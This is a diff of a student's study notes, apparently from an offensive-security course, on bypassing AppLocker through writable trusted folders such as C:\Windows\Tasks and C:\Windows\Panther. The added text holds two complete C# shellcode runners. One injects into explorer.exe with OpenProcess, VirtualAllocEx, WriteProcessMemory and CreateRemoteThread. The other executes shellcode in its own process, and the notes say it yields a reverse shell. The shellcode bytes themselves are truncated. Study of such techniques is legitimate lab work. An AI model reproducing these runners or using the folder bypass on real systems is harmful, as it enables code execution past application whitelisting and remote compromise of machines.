@@ -66,14 +66,28 @@ we can `copy C:\Windows\System32\calc.exe calc2.exe`
 
 on running form new user m. open cmd.exe and press shift opena s a different user
 
+### creating a deny all rule
+
+maybe it is required to create a deny all rule so that after all is allowed it does not allow execution from elsewhere. 
+
 
 ### 8.1.2.1 Exercises
 1. Configure default rules for all four categories of file types and enable AppLocker on your 
 Windows 10 victim VM.
+
+done
+
 2. Copy an executable to a location outside the whitelisted folders and observe how it is 
 blocked by AppLocker when executing it.
+
+same as ![](calculator_not_opening.png)
+
+how ever after switing gui in as user 
+now the calculator is opening everytime indicating applocjer does not work
+
 3. Create a small Jscript script, store it outside the whitelisted folders and execute it. Is it 
 blocked?
+The script executes
 
 # Basic Bypasses
 
@@ -81,8 +95,11 @@ we look at poor configuration enforced through default rules.
 
 # Trusted folders
 
-The default rules for AppLocker whitelist all executables and scripts located in C:\Program Files, 
-C:\Program Files (x86), and C:\Windows. This is a logical choice since it is assumed that non-admin users cannot write executables or scripts into these directories.
+The default rules for AppLocker whitelist all executables and scripts located in 
+
+C:\Program Files, C:\Program Files (x86), and C:\Windows. 
+
+This is a logical choice since it is assumed that non-admin users cannot write executables or scripts into these directories.
 In this section, we will put this assumption to the test as we construct our first (albeit very simple) 
 AppLocker bypass.
 In theory, we should be able to execute a program or script in a subdirectory that allows both 
@@ -120,17 +137,124 @@ trying to copy and run calc.exe in Tasks folder
 
 ![](./calculator_not_opening.png)
 
+but after switching user graphically it is now running.
+
+
+
+## Applocker not running on win10 pro
+
+applocker has requirements that it runs only in enterprise windows versions.
+
+Application and Services Logs\Microsoft\Windows, click AppLocker.
+
+in there in the log entries you can find that applocker doesnot work with SKU
+
+
 ### 8.2.1.1 Exercises
 1. Repeat the analysis to verify that C:\Windows\Tasks is both writable and executable for the 
 “student” user. Execute a copied executable from this directory.
 
-not wokrking
+it is running but running from everywhere.
 
-2. Locate another directory in C:\Windows that could be used for this bypass.
-3. Copy a C# shellcode runner executable into one of the writable and executable folders and 
+1. Locate another directory in C:\Windows that could be used for this bypass.
+
+`C:\Windows\Panther`
+
+2. Copy a C# shellcode runner executable into one of the writable and executable folders and 
 bypass AppLocker to obtain a reverse shell.
+
+
+```dotnetcli
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+namespace Inject
+{
+    class Program
+    {
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int
+       processId);
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint
+       dwSize, uint flAllocationType, uint flProtect);
+        [DllImport("kernel32.dll")]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
+       byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr
+       lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint
+       dwCreationFlags, IntPtr lpThreadId);
+        static void Main(string[] args)
+        {
+            Process[] localByName = Process.GetProcessesByName("explorer");
+            Console.WriteLine(localByName);
+            IntPtr hProcess = OpenProcess(0x001F0FFF, false, localByName[0].Id);
+            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
+            byte[] buf = new byte[582] {
+                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
+                0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
+                0x8b,0x52,0x20,0x4d,0x31,0xc9,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
+                ...0x89,0xda,0xff,0xd5 };
+            IntPtr outSize;
+            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
+            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr,IntPtr.Zero, 0, IntPtr.Zero);
+        }
+    }
+}
+```
+
+shellcode injector might not work because of the fact that explorer.exe might be running with system so we will put a simpler program
+
+```dotnetcli
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+namespace ConsoleApp1
+{
+    class Program
+    {
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint
+       flAllocationType, uint flProtect);
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
+       IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+        [DllImport("kernel32.dll")]
+        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32
+       dwMilliseconds);
+        static void Main(string[] args)
+        {
+            byte[] buf = new byte[582] {
+                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
+                0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
+                ...,0x0a,0x41,0x89,0xda,0xff,0xd5 };
+            int size = buf.Length;
+            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
+            Marshal.Copy(buf, 0, addr, size);
+            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0,
+IntPtr.Zero);
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
+        }
+    }
+}
+```
+
+this creates a reverse shell.
+
 4. Create a custom AppLocker rule to block the folder C:\Windows\Tasks. Make it a path rule 
 of type deny. Consult the online documentation if needed
+
+deny rule.
+
+
+# Completed till here but realised applocker was not working
+
+lets skip to next chapter then.
 
 # bypass with DLLs
 
@@ -281,6 +405,7 @@ cant check because it comes out to be FUll Language.
 ### 8.3.1.1 Exercises
 1. Verify that constrained language mode is enabled for a PowerShell prompt executed in the 
 context of the “student” user.
+
 2. Check if our existing PowerShell shellcode runner is stopped once constrained language 
 mode is enabled.
 
